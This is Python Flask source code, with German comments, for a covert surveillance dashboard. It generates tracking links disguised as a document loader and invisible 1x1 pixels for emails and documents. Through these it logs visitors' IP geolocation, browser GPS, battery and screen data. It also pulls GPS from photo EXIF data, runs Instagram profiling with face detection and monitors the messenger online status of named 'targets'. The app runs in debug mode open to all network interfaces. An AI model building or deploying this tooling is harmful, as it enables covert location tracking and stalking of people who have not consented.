import json
import io
import os
import sqlite3
import uuid
from datetime import datetime

import requests
from flask import (Flask, abort, jsonify, make_response, redirect,
                   render_template, request, url_for)
from PIL import Image
from PIL.ExifTags import GPSTAGS, TAGS

app = Flask(__name__)
DB_PATH = os.path.join(os.path.dirname(__file__), 'tracking.db')


def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db():
    with get_db() as conn:
        conn.executescript('''
            CREATE TABLE IF NOT EXISTS tokens (
                token      TEXT PRIMARY KEY,
                label      TEXT,
                created_at TEXT
            );
            CREATE TABLE IF NOT EXISTS events (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                token        TEXT,
                timestamp    TEXT,
                ip           TEXT,
                user_agent   TEXT,
                geo_country  TEXT,
                geo_city     TEXT,
                geo_lat      REAL,
                geo_lon      REAL,
                gps_lat      REAL,
                gps_lon      REAL,
                gps_accuracy REAL,
                screen       TEXT,
                timezone     TEXT,
                language     TEXT,
                battery      REAL,
                extra        TEXT
            );
            CREATE TABLE IF NOT EXISTS messenger_targets (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                label       TEXT,
                platform    TEXT,
                identifier  TEXT,
                created_at  TEXT
            );
            CREATE TABLE IF NOT EXISTS status_events (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id   INTEGER,
                timestamp   TEXT,
                status      TEXT,
                details     TEXT
            );
            CREATE TABLE IF NOT EXISTS bot_interactions (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp   TEXT,
                platform    TEXT,
                user_id     TEXT,
                username    TEXT,
                first_name  TEXT,
                last_name   TEXT,
                language    TEXT,
                token       TEXT,
                extra       TEXT
            );
            CREATE TABLE IF NOT EXISTS instagram_analyses (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                username    TEXT,
                started_at  TEXT,
                status      TEXT,
                result_json TEXT
            );
        ''')


def geolocate_ip(ip):
    """Resolve IP to country/city/coords via ip-api.com (free, no key)."""
    try:
        resp = requests.get(
            f'http://ip-api.com/json/{ip}',
            params={'fields': 'status,country,city,lat,lon'},
            timeout=3,
        )
        data = resp.json()
        if data.get('status') == 'success':
            return data['country'], data['city'], data['lat'], data['lon']
    except Exception:
        pass
    return None, None, None, None


def get_client_ip():
    forwarded = request.headers.get('X-Forwarded-For', '')
    if forwarded:
        return forwarded.split(',')[0].strip()
    return request.remote_addr


def extract_gps_from_exif(img_bytes):
    """Return {'lat': float, 'lon': float} or None if no GPS in EXIF."""
    try:
        img = Image.open(io.BytesIO(img_bytes))
        raw = img._getexif()
        if not raw:
            return None, {}

        all_tags = {TAGS.get(k, k): v for k, v in raw.items()}
        gps_raw = all_tags.get('GPSInfo', {})
        if not gps_raw:
            return None, all_tags

        def dms_to_dd(dms, ref):
            d, m, s = (float(x) for x in dms)
            dd = d + m / 60 + s / 3600
            return -dd if ref in ('S', 'W') else dd

        lat = lon = None
        if 2 in gps_raw and 4 in gps_raw:
            lat = dms_to_dd(gps_raw[2], gps_raw.get(1, 'N'))
            lon = dms_to_dd(gps_raw[4], gps_raw.get(3, 'E'))

        gps_readable = {GPSTAGS.get(k, k): str(v) for k, v in gps_raw.items()}
        coords = {'lat': round(lat, 6), 'lon': round(lon, 6)} if lat is not None else None
        return coords, gps_readable
    except Exception:
        return None, {}


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route('/')
def dashboard():
    with get_db() as conn:
        tokens = conn.execute(
            'SELECT * FROM tokens ORDER BY created_at DESC'
        ).fetchall()
        events = conn.execute(
            'SELECT * FROM events ORDER BY timestamp DESC LIMIT 200'
        ).fetchall()
    return render_template('dashboard.html', tokens=tokens, events=events)


@app.route('/generate', methods=['POST'])
def generate():
    label = request.form.get('label', 'Unbenannt').strip() or 'Unbenannt'
    token = str(uuid.uuid4())[:8]
    with get_db() as conn:
        conn.execute(
            'INSERT INTO tokens VALUES (?, ?, ?)',
            (token, label, datetime.utcnow().isoformat()),
        )
    return redirect(url_for('dashboard'))


@app.route('/delete/<token>', methods=['POST'])
def delete_token(token):
    with get_db() as conn:
        conn.execute('DELETE FROM events WHERE token=?', (token,))
        conn.execute('DELETE FROM tokens WHERE token=?', (token,))
    return redirect(url_for('dashboard'))


@app.route('/t/<token>')
def beacon(token):
    """The tracking link target — looks like a document loader."""
    with get_db() as conn:
        row = conn.execute(
            'SELECT * FROM tokens WHERE token=?', (token,)
        ).fetchone()
    if not row:
        abort(404)
    return render_template('beacon.html', token=token)


@app.route('/api/collect', methods=['POST'])
def collect():
    """JS-Beacon: empfängt Browser-Daten (GPS, Screen, Akku) vom Beacon-Template."""
    data = request.get_json(silent=True) or {}
    token = data.get('token', '')
    ip = get_client_ip()
    country, city, geo_lat, geo_lon = geolocate_ip(ip)

    with get_db() as conn:
        conn.execute(
            '''INSERT INTO events
               (token, timestamp, ip, user_agent,
                geo_country, geo_city, geo_lat, geo_lon,
                gps_lat, gps_lon, gps_accuracy,
                screen, timezone, language, battery, extra)
               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',
            (
                token,
                datetime.utcnow().isoformat(),
                ip,
                request.headers.get('User-Agent', ''),
                country, city, geo_lat, geo_lon,
                data.get('gps_lat'), data.get('gps_lon'), data.get('gps_accuracy'),
                data.get('screen'),
                data.get('timezone'),
                data.get('language'),
                data.get('battery'),
                json.dumps({'method': 'js-beacon', **data.get('extra', {})}),
            ),
        )
    return jsonify({'ok': True})


@app.route('/api/events')
def events_api():
    token = request.args.get('token')
    with get_db() as conn:
        if token:
            rows = conn.execute(
                'SELECT * FROM events WHERE token=? ORDER BY timestamp DESC',
                (token,),
            ).fetchall()
        else:
            rows = conn.execute(
                'SELECT * FROM events ORDER BY timestamp DESC LIMIT 200'
            ).fetchall()
    return jsonify([dict(r) for r in rows])


# 1x1 transparent PNG (keine Pillow-Abhängigkeit zur Laufzeit nötig)
_TRANSPARENT_PNG = (
    b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
    b'\x08\x06\x00\x00\x00\x1f\x15\xc4\x89\x00\x00\x00\nIDATx\x9cc\x00\x01'
    b'\x00\x00\x05\x00\x01\r\n-\xb4\x00\x00\x00\x00IEND\xaeB`\x82'
)


def log_event(token, extra=None):
    """Shared helper: geolocate + persist one tracking event."""
    ip = get_client_ip()
    country, city, geo_lat, geo_lon = geolocate_ip(ip)
    with get_db() as conn:
        conn.execute(
            '''INSERT INTO events
               (token, timestamp, ip, user_agent,
                geo_country, geo_city, geo_lat, geo_lon,
                gps_lat, gps_lon, gps_accuracy,
                screen, timezone, language, battery, extra)
               VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)''',
            (
                token,
                datetime.utcnow().isoformat(),
                ip,
                request.headers.get('User-Agent', ''),
                country, city, geo_lat, geo_lon,
                None, None, None,
                None, None, None, None,
                json.dumps(extra or {}),
            ),
        )


@app.route('/pixel/<token>')
def pixel(token):
    """
    Invisible 1×1 tracking pixel — kein JavaScript nötig.
    Einbinden per:  <img src="http://HOST/pixel/TOKEN" width="1" height="1">
    Funktioniert in HTML-E-Mails, Webseiten, Word-Dokumenten (bei aktivem HTTP).
    """
    log_event(token, extra={'method': 'pixel'})
    resp = make_response(_TRANSPARENT_PNG)
    resp.headers['Content-Type'] = 'image/png'
    # Caching verhindern damit jede Öffnung neu geloggt wird
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate'
    resp.headers['Pragma'] = 'no-cache'
    return resp


@app.route('/api/exif', methods=['POST'])
def exif_extract():
    if 'file' not in request.files:
        return jsonify({'error': 'Keine Datei angegeben'}), 400
    img_bytes = request.files['file'].read()
    coords, gps_tags = extract_gps_from_exif(img_bytes)
    return jsonify({'gps': coords, 'gps_tags': gps_tags})


# ---------------------------------------------------------------------------
# Instagram OSINT-Routen
# ---------------------------------------------------------------------------

@app.route('/instagram')
def instagram_dashboard():
    with get_db() as conn:
        analyses = conn.execute(
            'SELECT id, username, started_at, status FROM instagram_analyses ORDER BY started_at DESC'
        ).fetchall()
    return render_template('instagram.html', analyses=analyses)


@app.route('/instagram/analyze', methods=['POST'])
def instagram_analyze():
    from monitors.instagram_osint import start_analysis
    import tempfile, os as _os
    username        = request.form.get('username', '').strip().lstrip('@')
    max_posts       = int(request.form.get('max_posts', 40))
    analyze_network = request.form.get('analyze_network') == 'on'
    detect_faces    = request.form.get('detect_faces') == 'on'
    if not username:
        return 'Username fehlt', 400

    # Optionales manuelles Referenzbild
    ref_path = None
    ref_file = request.files.get('reference_image')
    if ref_file and ref_file.filename:
        fd, ref_path = tempfile.mkstemp(suffix='.jpg')
        ref_file.save(ref_path)
        _os.close(fd)

    start_analysis(username, max_posts=max_posts,
                   analyze_network=analyze_network,
                   detect_faces=detect_faces,
                   reference_image_path=ref_path)
    return redirect(url_for('instagram_dashboard'))


@app.route('/instagram/result/<int:analysis_id>')
def instagram_result(analysis_id):
    with get_db() as conn:
        row = conn.execute(
            'SELECT * FROM instagram_analyses WHERE id=?', (analysis_id,)
        ).fetchone()
    if not row:
        abort(404)
    result = json.loads(row['result_json'] or '{}')
    return render_template('instagram_result.html', row=row, result=result)


@app.route('/api/instagram/<int:analysis_id>')
def instagram_api(analysis_id):
    with get_db() as conn:
        row = conn.execute(
            'SELECT * FROM instagram_analyses WHERE id=?', (analysis_id,)
        ).fetchone()
    if not row:
        abort(404)
    return jsonify({'status': row['status'], 'result': json.loads(row['result_json'] or '{}')})


@app.route('/instagram/delete/<int:analysis_id>', methods=['POST'])
def instagram_delete(analysis_id):
    with get_db() as conn:
        conn.execute('DELETE FROM instagram_analyses WHERE id=?', (analysis_id,))
    return redirect(url_for('instagram_dashboard'))


# ---------------------------------------------------------------------------
# Messenger-Tracking-Routen
# ---------------------------------------------------------------------------

@app.route('/messenger')
def messenger():
    with get_db() as conn:
        targets = conn.execute(
            'SELECT * FROM messenger_targets ORDER BY created_at DESC'
        ).fetchall()
        status_events = conn.execute(
            '''SELECT se.*, mt.label, mt.platform, mt.identifier
               FROM status_events se
               JOIN messenger_targets mt ON se.target_id = mt.id
               ORDER BY se.timestamp DESC LIMIT 300'''
        ).fetchall()
        interactions = conn.execute(
            'SELECT * FROM bot_interactions ORDER BY timestamp DESC LIMIT 100'
        ).fetchall()
    return render_template(
        'messenger.html',
        targets=targets,
        status_events=status_events,
        interactions=interactions,
    )


@app.route('/messenger/target', methods=['POST'])
def add_messenger_target():
    label      = request.form.get('label', '').strip() or 'Unbenannt'
    platform   = request.form.get('platform', 'telegram')
    identifier = request.form.get('identifier', '').strip()
    if not identifier:
        return 'Identifier fehlt', 400
    with get_db() as conn:
        conn.execute(
            'INSERT INTO messenger_targets (label, platform, identifier, created_at) VALUES (?,?,?,?)',
            (label, platform, identifier, datetime.utcnow().isoformat()),
        )
    return redirect(url_for('messenger'))


@app.route('/messenger/target/<int:target_id>', methods=['POST'])
def delete_messenger_target(target_id):
    with get_db() as conn:
        conn.execute('DELETE FROM status_events WHERE target_id=?', (target_id,))
        conn.execute('DELETE FROM messenger_targets WHERE id=?', (target_id,))
    return redirect(url_for('messenger'))


@app.route('/api/messenger/status')
def api_status_events():
    target_id = request.args.get('target_id')
    with get_db() as conn:
        if target_id:
            rows = conn.execute(
                'SELECT * FROM status_events WHERE target_id=? ORDER BY timestamp DESC LIMIT 500',
                (target_id,),
            ).fetchall()
        else:
            rows = conn.execute(
                'SELECT * FROM status_events ORDER BY timestamp DESC LIMIT 500'
            ).fetchall()
    return jsonify([dict(r) for r in rows])


@app.route('/api/messenger/interactions')
def api_bot_interactions():
    with get_db() as conn:
        rows = conn.execute(
            'SELECT * FROM bot_interactions ORDER BY timestamp DESC LIMIT 200'
        ).fetchall()
    return jsonify([dict(r) for r in rows])


if __name__ == '__main__':
    init_db()
    app.run(debug=True, host='0.0.0.0', port=5000)
